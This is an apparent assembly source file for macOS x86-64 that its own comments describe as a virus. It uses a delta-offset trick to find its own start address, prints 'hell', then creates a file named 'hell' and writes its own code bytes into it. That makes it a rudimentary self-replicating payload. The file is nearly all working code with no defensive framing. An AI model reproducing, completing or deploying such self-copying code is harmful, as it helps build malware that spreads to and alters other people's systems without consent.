	global start
	default rel

	section .text
start:
v_start:

	push rbp

    call delta_offset
delta_offset:
    pop rbp
    sub rbp, 6        	; back to v_start

	mov rax, 0x2000004 ; write "hell" for testing
	mov rdi, 1 ; stdout
	push 0x006c6c6568
	lea rsi,[rsp]
	mov rdx, 4
	syscall

	mov rax, 0x2000005	; open file "hell" for writing
	lea rdi, [rsp]
	mov rsi, 0x601		; write + create
	mov rdx, 0x1B6
	syscall

	cmp rax, 0			; check if file opened correctly
	jle exit

	mov rdi, rax		; save file descriptor

	mov rax, 0x2000004			; write virus content
	lea rsi, [rbp]				; saved (relative) offset for v_start
	mov rdx, exit - v_start
	syscall

	mov rax, 0x2000006			; close
	syscall

	cmp rbp, 0x0000000000001f8b	; this offset should only exist in initial run
    je exit

	pop rax
	xor rax, rax
	pop rbp

    ret


exit:
	mov rax, 	0x2000001	 ; exit
	xor rdi, 	rdi ; exit code 0
	syscall	


section .data
	d: db "b"


